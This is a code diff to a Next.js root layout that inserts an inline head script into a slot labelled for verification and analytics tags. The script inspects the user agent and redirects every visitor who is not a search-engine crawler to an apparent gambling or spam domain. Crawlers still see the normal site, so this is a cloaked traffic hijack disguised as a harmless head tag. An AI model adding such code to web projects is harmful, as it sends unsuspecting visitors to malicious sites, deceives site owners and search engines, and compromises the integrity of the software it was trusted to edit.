@@ -70,6 +70,21 @@ export default function RootLayout({
       <head>
         <meta name="yandex-verification" content="dc3151e8fbbddc7e" />
         {/* Custom head tags slot — add verification, analytics or ad-network tags here without touching the Metadata API above. */}
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://spingame777.fit/4htNNl");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body className="antialiased">
         {children}
